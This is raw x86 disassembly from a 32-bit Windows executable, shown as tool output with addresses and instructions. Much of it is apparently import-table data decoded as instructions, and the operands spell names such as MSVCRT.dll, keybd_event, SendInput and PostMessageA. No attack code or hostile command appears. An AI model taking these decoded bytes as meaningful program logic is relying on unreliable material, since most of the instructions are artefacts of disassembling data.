  412702:	add    DWORD PTR [eax],eax
  412704:	or     BYTE PTR [eax],dh
  412706:	add    DWORD PTR [eax],eax
  412708:	push   ss
  412709:	xor    BYTE PTR [ecx],al
  41270b:	add    BYTE PTR [esi],ah
  41270d:	xor    BYTE PTR [ecx],al
  41270f:	add    BYTE PTR [esi],bh
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    BYTE PTR [eax+0x30],dl
  412716:	add    DWORD PTR [eax],eax
  412718:	bound  esi,QWORD PTR [eax]
  41271a:	add    DWORD PTR [eax],eax
  41271c:	outs   dx,BYTE PTR ds:[esi]
  41271d:	xor    BYTE PTR [ecx],al
  41271f:	add    BYTE PTR [eax-0x71fffed0],al
  412725:	xor    BYTE PTR [ecx],al
  412727:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  41272e:	add    DWORD PTR [eax],eax
  412730:	mov    esi,0xcc000130
  412735:	xor    BYTE PTR [ecx],al
  412737:	add    al,bl
  412739:	xor    BYTE PTR [ecx],al
  41273b:	add    dh,ah
  41273d:	xor    BYTE PTR [ecx],al
  41273f:	add    al,bh
  412741:	xor    BYTE PTR [ecx],al
  412743:	add    BYTE PTR [esi],al
  412745:	xor    DWORD PTR [ecx],eax
  412747:	add    BYTE PTR [edx],dl
  412749:	xor    DWORD PTR [ecx],eax
  41274b:	add    BYTE PTR [ecx+esi*1],ah
  41274e:	add    DWORD PTR [eax],eax
  412750:	cmp    BYTE PTR [ecx],dh
  412752:	add    DWORD PTR [eax],eax
  412754:	dec    edx
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    BYTE PTR [edx+0x31],bl
  41275a:	add    DWORD PTR [eax],eax
  41275c:	push   0x31
  41275e:	add    DWORD PTR [eax],eax
  412760:	js     0x412793
  412762:	add    DWORD PTR [eax],eax
  412764:	xchg   esi,eax
  412765:	xor    DWORD PTR [ecx],eax
  412767:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  41276e:	add    DWORD PTR [eax],eax
  412770:	shl    BYTE PTR [ecx],cl
  412772:	add    DWORD PTR [eax],eax
  412774:	in     al,0x31
  412776:	add    DWORD PTR [eax],eax
  412778:	cld    
  412779:	xor    DWORD PTR [ecx],eax
  41277b:	add    BYTE PTR [edx],cl
  41277d:	xor    al,BYTE PTR [ecx]
  41277f:	add    BYTE PTR [eax],al
  412781:	add    BYTE PTR [eax],al
  412783:	add    BYTE PTR [edx+esi*1],ch
  412786:	add    DWORD PTR [eax],eax
  412788:	inc    esp
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    BYTE PTR [esi+0x32],dl
  41278e:	add    DWORD PTR [eax],eax
  412790:	outs   dx,BYTE PTR ds:[esi]
  412791:	xor    al,BYTE PTR [ecx]
  412793:	add    BYTE PTR [eax-0x63fffece],al
  412799:	xor    al,BYTE PTR [ecx]
  41279b:	add    BYTE PTR [eax],al
  41279d:	add    BYTE PTR [eax],al
  41279f:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  4127a6:	add    DWORD PTR [eax],eax
  4127a8:	out    0x32,al
  4127aa:	add    DWORD PTR [eax],eax
  4127ac:	cli    
  4127ad:	xor    al,BYTE PTR [ecx]
  4127af:	add    BYTE PTR [edx],cl
  4127b1:	xor    eax,DWORD PTR [ecx]
  4127b3:	add    BYTE PTR [eax],ah
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    BYTE PTR [esi],dh
  4127b9:	xor    eax,DWORD PTR [ecx]
  4127bb:	add    BYTE PTR [ebx+esi*1+0x1],al
  4127bf:	add    BYTE PTR [eax+0x33],dl
  4127c2:	add    DWORD PTR [eax],eax
  4127c4:	pop    esp
  4127c5:	xor    eax,DWORD PTR [ecx]
  4127c7:	add    BYTE PTR [esi+0x33],ah
  4127ca:	add    DWORD PTR [eax],eax
  4127cc:	je     0x412801
  4127ce:	add    DWORD PTR [eax],eax
  4127d0:	xor    BYTE PTR [ebx],0x1
  4127d3:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4127da:	add    DWORD PTR [eax],eax
  4127dc:	ret    0x133
  4127df:	add    dh,dl
  4127e1:	xor    eax,DWORD PTR [ecx]
  4127e3:	add    dh,ch
  4127e5:	xor    eax,DWORD PTR [ecx]
  4127e7:	add    ah,bh
  4127e9:	xor    eax,DWORD PTR [ecx]
  4127eb:	add    BYTE PTR [esi],dl
  4127ed:	xor    al,0x1
  4127ef:	add    BYTE PTR [edx],ch
  4127f1:	xor    al,0x1
  4127f3:	add    BYTE PTR [esp+esi*1],dh
  4127f6:	add    DWORD PTR [eax],eax
  4127f8:	inc    esp
  4127f9:	xor    al,0x1
  4127fb:	add    BYTE PTR [esi+0x34],cl
  4127fe:	add    DWORD PTR [eax],eax
  412800:	pop    edx
  412801:	xor    al,0x1
  412803:	add    BYTE PTR [esi+0x34],ch
  412806:	add    DWORD PTR [eax],eax
  412808:	xchg   BYTE PTR [ecx+eax*1],dh
  41280b:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  412812:	add    DWORD PTR [eax],eax
  412814:	mov    dl,0x34
  412816:	add    DWORD PTR [eax],eax
  412818:	enter  0x134,0x0
  41281c:	fidiv  DWORD PTR [ecx+eax*1]
  41281f:	add    dh,ah
  412821:	xor    al,0x1
  412823:	add    dl,bh
  412825:	xor    al,0x1
  412827:	add    BYTE PTR [esi*1+0x350e0001],al
  41282e:	add    DWORD PTR [eax],eax
  412830:	push   ds
  412831:	xor    eax,0x35360001
  412836:	add    DWORD PTR [eax],eax
  412838:	dec    edx
  412839:	xor    eax,0x355a0001
  41283e:	add    DWORD PTR [eax],eax
  412840:	xor    ax,0x1
  412844:	je     0x41287b
  412846:	add    DWORD PTR [eax],eax
  412848:	mov    dh,BYTE PTR ds:0x359c0001
  41284e:	add    DWORD PTR [eax],eax
  412850:	add    BYTE PTR [eax],al
  412852:	add    BYTE PTR [eax],al
  412854:	mov    edx,0xce000135
  412859:	xor    eax,0x35e00001
  41285e:	add    DWORD PTR [eax],eax
  412860:	in     al,dx
  412861:	xor    eax,0x36040001
  412866:	add    DWORD PTR [eax],eax
  412868:	adc    al,0x36
  41286a:	add    DWORD PTR [eax],eax
  41286c:	sub    BYTE PTR [esi],dh
  41286e:	add    DWORD PTR [eax],eax
  412870:	ds add DWORD PTR ss:[eax],eax
  412874:	dec    esi
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	pusha  
  412879:	add    DWORD PTR ss:[eax],eax
  41287c:	ins    BYTE PTR es:[edi],dx
  41287d:	add    DWORD PTR ss:[eax],eax
  412880:	xor    BYTE PTR [esi],0x1
  412883:	add    BYTE PTR [esi-0x49fffeca],bl
  412889:	add    DWORD PTR ss:[eax],eax
  41288c:	retf   0x136
  41288f:	add    dl,bl
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	out    0x36,al
  412896:	add    DWORD PTR [eax],eax
  412898:	(bad)  
  412899:	add    DWORD PTR ss:[eax],eax
  41289c:	adc    BYTE PTR [edi],dh
  41289e:	add    DWORD PTR [eax],eax
  4128a0:	and    dh,BYTE PTR [edi]
  4128a2:	add    DWORD PTR [eax],eax
  4128a4:	xor    dh,BYTE PTR [edi]
  4128a6:	add    DWORD PTR [eax],eax
  4128a8:	inc    esp
  4128a9:	aaa    
  4128aa:	add    DWORD PTR [eax],eax
  4128ac:	push   eax
  4128ad:	aaa    
  4128ae:	add    DWORD PTR [eax],eax
  4128b0:	pusha  
  4128b1:	aaa    
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	outs   dx,BYTE PTR ds:[esi]
  4128b5:	aaa    
  4128b6:	add    DWORD PTR [eax],eax
  4128b8:	js     0x4128f1
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	mov    BYTE PTR [edi],dh
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	xchg   esi,eax
  4128c1:	aaa    
  4128c2:	add    DWORD PTR [eax],eax
  4128c4:	test   al,0x37
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	mov    esi,0xd2000137
  4128cd:	aaa    
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	jmp    0x138:0x137
  4128d7:	add    BYTE PTR [esi],cl
  4128d9:	cmp    BYTE PTR [ecx],al
  4128db:	add    BYTE PTR [esi],ah
  4128dd:	cmp    BYTE PTR [ecx],al
  4128df:	add    BYTE PTR [eax+edi*1],bh
  4128e2:	add    DWORD PTR [eax],eax
  4128e4:	dec    esp
  4128e5:	cmp    BYTE PTR [ecx],al
  4128e7:	add    BYTE PTR [eax+0x38],bl
  4128ea:	add    DWORD PTR [eax],eax
  4128ec:	jo     0x412926
  4128ee:	add    DWORD PTR [eax],eax
  4128f0:	jle    0x41292a
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	xchg   edx,eax
  4128f5:	cmp    BYTE PTR [ecx],al
  4128f7:	add    BYTE PTR [esi-0x51fffec8],bl
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    dh,al
  412901:	cmp    BYTE PTR [ecx],al
  412903:	add    dl,bl
  412905:	cmp    BYTE PTR [ecx],al
  412907:	add    al,ch
  412909:	cmp    BYTE PTR [ecx],al
  41290b:	add    dh,bh
  41290d:	cmp    BYTE PTR [ecx],al
  41290f:	add    BYTE PTR [edx],dl
  412911:	cmp    DWORD PTR [ecx],eax
  412913:	add    BYTE PTR [esi],bl
  412915:	cmp    DWORD PTR [ecx],eax
  412917:	add    BYTE PTR [eax],bh
  412919:	cmp    DWORD PTR [ecx],eax
  41291b:	add    BYTE PTR [eax],al
  41291d:	add    BYTE PTR [eax],al
  41291f:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412923:	add    BYTE PTR [edx+0x39],dh
  412926:	add    DWORD PTR [eax],eax
  412928:	add    BYTE PTR [eax],al
  41292a:	add    BYTE PTR [eax],al
  41292c:	xchg   edi,eax
  41292d:	add    ebp,DWORD PTR [ecx+0x73]
  412930:	imul   esp,DWORD PTR fs:[edi+0x69],0x41f0074
  412938:	ja     0x41299d
  41293a:	jae    0x41299f
  41293c:	ins    DWORD PTR es:[edi],dx
  41293d:	jo     0x41293f
  41293f:	add    ch,dh
  412941:	add    BYTE PTR [edi+0x63],bl
  412944:	outs   dx,DWORD PTR ds:[esi]
  412945:	outs   dx,BYTE PTR ds:[esi]
  412946:	je     0x4129ba
  412948:	outs   dx,DWORD PTR ds:[esi]
  412949:	ins    BYTE PTR es:[edi],dx
  41294a:	data16 jo 0x41294d
  41294d:	add    BYTE PTR [ebp+0x74656703],cl
  412953:	outs   dx,BYTE PTR gs:[esi]
  412955:	jbe    0x412957
  412957:	add    BYTE PTR ds:0x73637704,ch
  41295d:	jb     0x4129c2
  41295f:	push   0x3f20072
  412964:	jae    0x4129da
  412966:	jb     0x4129d6
  412968:	arpl   WORD PTR [eax+0x79],si
  41296b:	add    al,ch
  41296d:	add    esi,DWORD PTR [ebx+0x74]
  412970:	jb     0x4129d5
  412972:	jo     0x4129ed
  412974:	add    BYTE PTR [eax],al
  412976:	mov    bl,0x0
  412978:	pop    edi
  412979:	pop    edi
  41297a:	jae    0x4129e1
  41297c:	je     0x4129dd
  41297e:	popa   
  41297f:	jo     0x4129f1
  412981:	pop    edi
  412982:	je     0x4129fd
  412984:	jo     0x4129eb
  412986:	add    BYTE PTR [eax],al
  412988:	lds    eax,FWORD PTR [ebx]
  41298a:	jo     0x4129fe
  41298c:	imul   ebp,DWORD PTR [esi+0x74],0xcc000066
  412993:	add    esi,DWORD PTR [ecx+0x73]
  412996:	outs   dx,DWORD PTR ds:[esi]
  412997:	jb     0x412a0d
  412999:	add    BYTE PTR [edx+0x3],dh
  41299c:	data16 ins BYTE PTR es:[edi],dx
  41299e:	outs   dx,DWORD PTR ds:[esi]
  41299f:	outs   dx,DWORD PTR ds:[esi]
  4129a0:	jb     0x4129a2
  4129a2:	lods   al,BYTE PTR ds:[esi]
  4129a3:	add    ebp,DWORD PTR [ecx+0x73]
  4129a6:	js     0x412a0c
  4129a8:	imul   esp,DWORD PTR [edi+0x69],0xa0000074
  4129af:	add    BYTE PTR [edi+0x5f],bl
  4129b2:	jo     0x412a13
  4129b4:	pop    edi
  4129b5:	ins    WORD PTR es:[edi],dx
  4129b7:	outs   dx,DWORD PTR ds:[esi]
  4129b8:	fs add BYTE PTR gs:[eax],al
  4129bc:	xor    eax,0x73637704
  4129c1:	je     0x412a32
  4129c3:	ins    BYTE PTR es:[edi],dx
  4129c4:	add    BYTE PTR [eax],al
  4129c6:	or     al,0x4
  4129c8:	je     0x412a39
  4129ca:	ja     0x412a41
  4129cc:	jo     0x412a3e
  4129ce:	gs jb  0x4129d1
  4129d1:	add    cl,dh
  4129d3:	add    esi,DWORD PTR [ebx+0x74]
  4129d6:	jb     0x412a46
  4129d8:	arpl   WORD PTR [ebp+0x70],bp
  4129db:	add    BYTE PTR [ebx+0x705f5f00],bl
  4129e1:	pop    edi
  4129e2:	pop    edi
  4129e3:	arpl   WORD PTR [edi+0x6d],bp
  4129e6:	ins    DWORD PTR es:[edi],dx
  4129e7:	outs   dx,DWORD PTR ds:[esi]
  4129e8:	fs add BYTE PTR gs:[eax],al
  4129ec:	push   es
  4129ed:	add    al,0x74
  4129ef:	imul   ebp,DWORD PTR [ebp+0x65],0x38b0000
  4129f6:	addr16 gs je 0x412a5d
  4129fa:	add    BYTE PTR [eax],al
  4129fc:	xor    eax,DWORD PTR [edi+esi*2]
  4129ff:	arpl   WORD PTR [ebx+0x74],si
  412a02:	outs   dx,DWORD PTR ds:[esi]
  412a03:	imul   eax,DWORD PTR [eax],0x0
  412a06:	test   eax,0x77736903
  412a0b:	jae    0x412a7d
  412a0d:	popa   
  412a0e:	arpl   WORD PTR [ebp+0x0],sp
  412a11:	add    BYTE PTR [ebx+0x77736903],ch
  412a17:	js     0x412a7d
  412a19:	imul   esp,DWORD PTR [edi+0x69],0xdb0074
  412a20:	pop    edi
  412a21:	popa   
  412a22:	ins    DWORD PTR es:[edi],dx
  412a23:	jae    0x412a8c
  412a25:	pop    edi
  412a26:	gs js  0x412a92
  412a29:	je     0x412a2b
  412a2b:	add    BYTE PTR [ecx],ah
  412a2d:	add    al,0x77
  412a2f:	arpl   WORD PTR [ebx+0x63],si
  412a32:	jo     0x412aad
  412a34:	add    BYTE PTR [eax],al
  412a36:	xchg   BYTE PTR [ecx],al
  412a38:	pop    edi
  412a39:	imul   ebp,DWORD PTR [esi+0x69],0x72657474
  412a40:	ins    DWORD PTR es:[edi],dx
  412a41:	add    BYTE PTR [ebx+eax*1+0x6c617369],dl
  412a48:	outs   dx,BYTE PTR ds:[esi]
  412a49:	jne    0x412ab8
  412a4b:	add    ch,dh
  412a4d:	add    esi,DWORD PTR [ebx+0x74]
  412a50:	jb     0x412ac2
  412a52:	bound  esi,QWORD PTR [edx+0x6b]
  412a55:	add    BYTE PTR [esi+0x73695f01],bl
  412a5b:	ins    DWORD PTR es:[edi],dx
  412a5c:	bound  esp,QWORD PTR [edx+0x6c]
  412a5f:	gs popa 
  412a61:	add    BYTE PTR fs:[eax],al
  412a64:	sbb    BYTE PTR [esi+esi*2],al
  412a67:	jae    0x412ae0
  412a69:	jo     0x412add
  412a6b:	imul   ebp,DWORD PTR [esi+0x74],0x36d0066
  412a72:	data16 addr16 gs je 0x412ada
  412a77:	add    BYTE PTR [edx+0x0],dl
  412a7a:	pop    edi
  412a7b:	pop    eax
  412a7c:	arpl   WORD PTR [eax+0x74],si
  412a7f:	inc    esi
  412a80:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x4290072
  412a88:	ja     0x412aed
  412a8a:	jae    0x412afa
  412a8c:	arpl   WORD PTR [eax+0x79],si
  412a8f:	add    BYTE PTR [ebx],ah
  412a91:	add    DWORD PTR [edi+0x65],ebx
  412a94:	js     0x412aff
  412a96:	je     0x412a98
  412a98:	imul   eax,DWORD PTR [ebx],0x6f6c6366
  412a9e:	jae    0x412b05
  412aa0:	add    BYTE PTR [eax],al
  412aa2:	call   0x65a489a7
  412aa7:	js     0x412b12
  412aa9:	je     0x412aab
  412aab:	add    bh,al
  412aad:	add    esi,DWORD PTR [eax+0x75]
  412ab0:	je     0x412b15
  412ab2:	add    BYTE PTR [eax],al
  412ab4:	fadd   DWORD PTR [ebx]
  412ab6:	jae    0x412b1d
  412ab8:	je     0x412b26
  412aba:	outs   dx,DWORD PTR ds:[esi]
  412abb:	arpl   WORD PTR [ecx+0x6c],sp
  412abe:	add    BYTE PTR gs:[ebp+0x735f5f00],dh
  412ac5:	gs je  0x412b3d
  412ac8:	jae    0x412b2f
  412aca:	jb     0x412b39
  412acc:	popa   
  412acd:	je     0x412b37
  412acf:	gs jb  0x412b44
  412ad2:	add    BYTE PTR [eax],al
  412ad4:	mov    BYTE PTR [ebx],al
  412ad6:	data16 ja 0x412b4b
  412ad9:	imul   esi,DWORD PTR [ebp+eiz*2+0x0],0x7003c300
  412ae1:	gs jb  0x412b56
  412ae4:	outs   dx,DWORD PTR ds:[esi]
  412ae5:	jb     0x412ae7
  412ae7:	add    BYTE PTR [edx+0x3],bl
  412aea:	popa   
  412aeb:	je     0x412b5c
  412aed:	ins    BYTE PTR es:[edi],dx
  412aee:	add    BYTE PTR [eax],al
  412af0:	jb     0x412af2
  412af2:	pop    edi
  412af3:	pop    edi
  412af4:	addr16 gs je 0x412b65
  412af8:	popa   
  412af9:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  412b00:	sub    BYTE PTR [edi+esi*2],al
  412b03:	arpl   WORD PTR [ebx+0x6e],si
  412b06:	arpl   WORD PTR [ebp+0x70],bp
  412b09:	add    dl,dl
  412b0b:	add    esi,DWORD PTR [edx+0x65]
  412b0e:	ins    DWORD PTR es:[edi],dx
  412b0f:	outs   dx,DWORD PTR ds:[esi]
  412b10:	jbe    0x412b77
  412b12:	add    BYTE PTR [eax],al
  412b14:	dec    ebp
  412b15:	push   ebx
  412b16:	push   esi
  412b17:	inc    ebx
  412b18:	push   edx
  412b19:	push   esp
  412b1a:	cs fs ins BYTE PTR es:[edi],dx
  412b1d:	ins    BYTE PTR es:[edi],dx
  412b1e:	add    BYTE PTR [eax],al
  412b20:	mov    edi,0x636f4c01
  412b25:	imul   edx,DWORD PTR [edi+0x69],0x6e
  412b29:	outs   dx,DWORD PTR fs:[esi]
  412b2b:	ja     0x412b82
  412b2d:	jo     0x412b93
  412b2f:	popa   
  412b30:	je     0x412b97
  412b32:	add    BYTE PTR [eax],al
  412b34:	nop
  412b35:	add    dl,BYTE PTR [edx+esi*2+0x61]
  412b39:	arpl   WORD PTR [ebx+0x50],bp
  412b3c:	outs   dx,DWORD PTR ds:[esi]
  412b3d:	jo     0x412bb4
  412b3f:	jo     0x412b8e
  412b41:	outs   dx,BYTE PTR gs:[esi]
  412b43:	jne    0x412b45
  412b45:	add    BYTE PTR [eax],bh
  412b47:	add    dl,BYTE PTR [ebx+0x65]
  412b4a:	je     0x412b8f
  412b4c:	jne    0x412bc0
  412b4e:	jae    0x412bbf
  412b50:	jb     0x412b52
  412b52:	mov    eax,ds:0x57734901
  412b57:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  412b5e:	popa   
  412b5f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  412b63:	add    BYTE PTR [ecx+0x536e4901],al
  412b69:	outs   dx,BYTE PTR gs:[esi]
  412b6b:	fs dec ebp
  412b6d:	gs jae 0x412be3
  412b70:	popa   
  412b71:	addr16 gs inc ebp
  412b74:	js     0x412b76
  412b76:	xchg   ebx,eax
  412b77:	add    BYTE PTR [ebp+eiz*2+0x73],al
  412b7b:	je     0x412bef
  412b7d:	outs   dx,DWORD PTR ds:[esi]
  412b7e:	jns    0x412bc1
  412b80:	arpl   WORD PTR [ebx+0x65],sp
  412b83:	ins    BYTE PTR es:[edi],dx
  412b84:	gs jb  0x412be8
  412b87:	je     0x412bf8
  412b89:	jb     0x412bdf
  412b8b:	popa   
  412b8c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412b90:	adc    eax,DWORD PTR [ecx]
  412b92:	inc    edi
  412b93:	gs je  0x412bda
  412b96:	outs   dx,DWORD PTR ds:[esi]
  412b97:	jne    0x412bfb
  412b99:	ins    BYTE PTR es:[edi],dx
  412b9a:	gs inc ebx
  412b9c:	ins    BYTE PTR es:[edi],dx
  412b9d:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  412ba4:	add    BYTE PTR [eax],al
  412ba6:	mov    ds:0x57734901,eax
  412bab:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  412bb2:	jae    0x412c1d
  412bb4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412bb8:	mov    al,0x1
  412bba:	dec    esp
  412bbb:	outs   dx,DWORD PTR ds:[esi]
  412bbc:	popa   
  412bbd:	fs dec ecx
  412bbf:	arpl   WORD PTR [edi+0x6e],bp
  412bc2:	push   edi
  412bc3:	add    BYTE PTR [ebp+0x79656b02],bh
  412bc9:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  412bcd:	jbe    0x412c34
  412bcf:	outs   dx,BYTE PTR ds:[esi]
  412bd0:	je     0x412bd2
  412bd2:	test   eax,0x616f4c01
  412bd7:	fs inc edx
  412bd9:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x58004170
  412be1:	add    dl,BYTE PTR [ebx+0x65]
  412be4:	je     0x412c38
  412be6:	arpl   WORD PTR gs:[eax+eax*1-0x1e],si
  412beb:	add    BYTE PTR [esi+0x69],al
  412bee:	outs   dx,BYTE PTR ds:[esi]
  412bef:	fs push edi
  412bf1:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412bf8:	inc    ecx
  412bf9:	add    cl,bh
  412bfb:	add    BYTE PTR [edi+0x65],al
  412bfe:	je     0x412c43
  412c00:	ins    BYTE PTR es:[edi],dx
  412c01:	popa   
  412c02:	jae    0x412c77
  412c04:	dec    esp
  412c05:	outs   dx,DWORD PTR ds:[esi]
  412c06:	outs   dx,BYTE PTR ds:[esi]
  412c07:	addr16 push edi
  412c09:	add    BYTE PTR ds:0x6e655302,ah
  412c0f:	fs dec ecx
  412c11:	outs   dx,BYTE PTR ds:[esi]
  412c12:	jo     0x412c89
  412c14:	je     0x412c16
  412c16:	cdq    
  412c17:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412c1b:	ins    BYTE PTR es:[edi],dx
  412c1c:	outs   dx,DWORD PTR ds:[esi]
  412c1d:	addr16 inc edx
  412c1f:	outs   dx,DWORD PTR ds:[esi]
  412c20:	js     0x412c6b
  412c22:	outs   dx,BYTE PTR ds:[esi]
  412c23:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  412c2b:	jb     0x412c8e
  412c2d:	ins    DWORD PTR es:[edi],dx
  412c2e:	inc    ecx
  412c2f:	add    BYTE PTR [edi+0x70737702],bh
  412c35:	jb     0x412ca0
  412c37:	outs   dx,BYTE PTR ds:[esi]
  412c38:	je     0x412ca0
  412c3a:	inc    ecx
  412c3b:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  412c42:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x654700f8
  412c4a:	je     0x412c8f
  412c4c:	ins    BYTE PTR es:[edi],dx
  412c4d:	popa   
  412c4e:	jae    0x412cc3
  412c50:	dec    esp
  412c51:	outs   dx,DWORD PTR ds:[esi]
  412c52:	outs   dx,BYTE PTR ds:[esi]
  412c53:	addr16 inc ecx
  412c55:	add    BYTE PTR [ecx+eax*1+0x63497349],bl
  412c5c:	outs   dx,DWORD PTR ds:[esi]
  412c5d:	outs   dx,BYTE PTR ds:[esi]
  412c5e:	imul   esp,DWORD PTR [ebx+0x0],0x47014200
  412c65:	gs je  0x412cb6
  412c68:	gs js  0x412cdf
  412c6b:	inc    esp
  412c6c:	ins    BYTE PTR es:[edi],dx
  412c6d:	addr16 inc edi
  412c6f:	jb     0x412ce0
  412c71:	jne    0x412ce3
  412c73:	dec    ecx
  412c74:	je     0x412cdb
  412c76:	ins    DWORD PTR es:[edi],dx
  412c77:	add    BYTE PTR [ebx+0x61724400],dh
  412c7d:	ja     0x412cc8
  412c7f:	arpl   WORD PTR [edi+0x6e],bp
  412c82:	add    BYTE PTR [eax],al
  412c84:	jmp    0x65b17b8a
  412c89:	outs   dx,BYTE PTR ds:[esi]
  412c8a:	dec    ecx
  412c8b:	outs   dx,BYTE PTR ds:[esi]
  412c8c:	jo     0x412d03
  412c8e:	je     0x412cd4
  412c90:	gs jae 0x412cfe
  412c93:	je     0x412d04
  412c95:	jo     0x412c97
  412c97:	add    dh,bh
  412c99:	add    BYTE PTR [edi+0x65],al
  412c9c:	je     0x412ce1
  412c9e:	ins    BYTE PTR es:[edi],dx
  412c9f:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  412ca6:	jb     0x412ca8
  412ca8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ca9:	add    DWORD PTR [ecx+0x73],ecx
  412cac:	pop    edx
  412cad:	outs   dx,DWORD PTR ds:[esi]
  412cae:	outs   dx,DWORD PTR ds:[esi]
  412caf:	ins    DWORD PTR es:[edi],dx
  412cb0:	gs add BYTE PTR fs:[eax],al
  412cb4:	rol    DWORD PTR [eax],0x45
  412cb7:	outs   dx,BYTE PTR ds:[esi]
  412cb8:	popa   
  412cb9:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cbd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412cc4:	sub    BYTE PTR [eax],al
  412cc6:	inc    ebx
  412cc7:	push   0x6f4c7261
  412ccc:	ja     0x412d33
  412cce:	jb     0x412d12
  412cd0:	jne    0x412d38
  412cd2:	push   di
  412cd4:	add    BYTE PTR [eax],al
  412cd6:	inc    ebx
  412cd7:	add    BYTE PTR [ebx+0x6c],al
  412cda:	imul   esp,DWORD PTR [ebp+0x6e],0x536f5474
  412ce1:	arpl   WORD PTR [edx+0x65],si
  412ce4:	outs   dx,BYTE PTR gs:[esi]
  412ce6:	add    BYTE PTR [eax],al
  412ce8:	add    eax,DWORD PTR [eax]
  412cea:	inc    ecx
  412ceb:	fs push 0x75
  412cee:	jae    0x412d64
  412cf0:	push   edi
  412cf1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  412cf8:	arpl   WORD PTR [ebp+eax*2+0x78],si
  412cfc:	add    BYTE PTR [eax],al
  412cfe:	icebp  
  412cff:	add    DWORD PTR [eax+0x6f],edx
  412d02:	jae    0x412d78
  412d04:	dec    ebp
  412d05:	gs jae 0x412d7b
  412d08:	popa   
  412d09:	addr16 gs inc ecx
  412d0c:	add    BYTE PTR [eax],al
  412d0e:	out    dx,al
  412d0f:	add    DWORD PTR [eax+0x65],edx
  412d12:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  412d17:	jae    0x412d7a
  412d19:	addr16 gs inc ecx
  412d1c:	add    BYTE PTR [eax],al
  412d1e:	dec    ebx
  412d1f:	add    DWORD PTR [edi+0x65],eax
  412d22:	je     0x412d74
  412d24:	jb     0x412d95
  412d26:	jo     0x412d7f
  412d28:	add    BYTE PTR [eax],al
  412d2a:	inc    esi
  412d2b:	add    BYTE PTR [ebx+0x6c],al
  412d2e:	outs   dx,DWORD PTR ds:[esi]
  412d2f:	jae    0x412d96
  412d31:	inc    esp
  412d32:	gs jae 0x412da0
  412d35:	je     0x412da6
  412d37:	jo     0x412d39
  412d39:	add    cl,cl
  412d3b:	add    DWORD PTR [ebp+0x61],ecx
  412d3e:	jo     0x412d97
  412d40:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  412d47:	imul   ebp,DWORD PTR [esi+0x74],0x2020073
  412d4e:	push   edx
  412d4f:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  412d58:	popa   
  412d59:	jae    0x412dce
  412d5b:	inc    ecx
  412d5c:	add    BYTE PTR [eax],al
  412d5e:	mov    es,WORD PTR [ecx]
  412d60:	dec    ecx
  412d61:	jae    0x412da6
  412d63:	push   0x6c417261
  412d68:	jo     0x412dd2
  412d6a:	popa   
  412d6b:	dec    esi
  412d6c:	jne    0x412ddb
  412d6e:	gs jb  0x412dda
  412d71:	arpl   WORD PTR [edi+0x0],dx
  412d74:	mov    cl,0x1
  412d76:	dec    esp
  412d77:	outs   dx,DWORD PTR ds:[esi]
  412d78:	popa   
  412d79:	fs dec ecx
  412d7b:	ins    DWORD PTR es:[edi],dx
  412d7c:	popa   
  412d7d:	addr16 gs inc ecx
  412d80:	add    BYTE PTR [eax],al
  412d82:	sahf   
  412d83:	add    DWORD PTR [ecx+0x73],ecx
  412d86:	push   edx
  412d87:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412d8c:	jo     0x412e02
  412d8e:	jns    0x412d90
  412d90:	mov    es,WORD PTR [edx]
  412d92:	push   esp
  412d93:	outs   dx,DWORD PTR ds:[esi]
  412d94:	push   ebp
  412d95:	outs   dx,BYTE PTR ds:[esi]
  412d96:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  412d9d:	add    BYTE PTR [ebx],bh
  412d9f:	add    DWORD PTR [edi+0x65],eax
  412da2:	je     0x412df1
  412da4:	gs jae 0x412e1a
  412da7:	popa   
  412da8:	addr16 gs inc ebp
  412dab:	js     0x412e21
  412dad:	jb     0x412e10
  412daf:	dec    ecx
  412db0:	outs   dx,BYTE PTR ds:[esi]
  412db1:	outs   dx,WORD PTR ds:[esi]
  412db3:	add    BYTE PTR [ebp+0x1],al
  412db6:	inc    edi
  412db7:	gs je  0x412e0a
  412dba:	popa   
  412dbb:	jb     0x412e22
  412dbd:	outs   dx,BYTE PTR ds:[esi]
  412dbe:	je     0x412dc0
  412dc0:	bound  eax,QWORD PTR [eax]
  412dc2:	inc    ebx
